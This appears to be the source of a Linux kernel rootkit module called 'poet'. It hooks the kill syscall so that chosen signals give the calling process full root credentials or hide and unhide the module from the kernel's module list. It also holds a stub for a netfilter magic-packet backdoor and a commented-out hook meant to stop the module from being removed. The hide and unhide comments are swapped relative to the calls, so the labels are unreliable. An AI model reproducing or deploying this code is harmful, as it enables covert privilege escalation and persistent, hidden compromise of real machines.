#include "inc/poet.h"


unsigned int my_nf_hookfn(void *priv,
              struct sk_buff *skb,
              const struct nf_hook_state *state)
{
// netfilter magic packet code here
// POET+whoami
// call_usermodehelper
// potentially drop packet after
// output?

      return NF_ACCEPT;
}


asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    int sig = regs->si;

    if ( sig == 63 ) // give root
    {
        printk(KERN_INFO "poetry: giving root...\n");
        set_root();
        return 0;
    }
	else if ( sig == 64 ) // unhide poet
	{
		hideme();
        printk(KERN_INFO "poetry: unhiding module...\n");
        return 0;
	}
	else if ( sig == 65) // hide poet
	{
		showme();
        printk(KERN_INFO "poetry: hiding module...\n");
		return 0;
	}

    return orig_kill(regs);

}


// asmlinkage int hook_delete_module(const struct pt_regs *regs)
// {
// 	char* kernel_filename;
// 	kernel_filename = kmalloc(4096, GFP_KERNEL);

// 	if(!kernel_filename)
// 	{
// 		return NULL;
// 	}

// 	if (strncpy_from_user(kernel_filename, (char*)regs->di, 4096) < 0) 
// 	{
// 		printk(KERN_WARNING "Error: strncpy\n");
// 		kfree(kernel_filename);
// 		return NULL;
// 	}
	
// 	printk(KERN_INFO "%s\n", kernel_filename);

// 	if (hidden == 1) 
// 	{	
// 		if (strcmp(kernel_filename, "poet") == 0) 
// 		{
// 			printk(KERN_INFO "No food for you!\n");
// 			goto free;
// 		}
//     	else if (strcmp(kernel_filename, "teop") == 0)
// 		{
// 			hidden = 0;
// 			printk(KERN_INFO "hidden no more%s\n", kernel_filename);
// 			goto free;
// 		} 
// 	}

// 	// normal execution	
// 	kfree(kernel_filename);
// 	return orig_delete_module(regs);

// free:
// 	printk(KERN_INFO "hit free\n");
// 	kfree(kernel_filename);
// 	return ENOENT;
// }


void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}


void showme(void)
{
    /* Add the saved list_head struct back to the module list */
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}


void hideme(void)
{
    /* Save the module in the list before us, so we can add ourselves
     * back to the list in the same place later. */
    prev_module = THIS_MODULE->list.prev;
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
    hidden = 1;
}
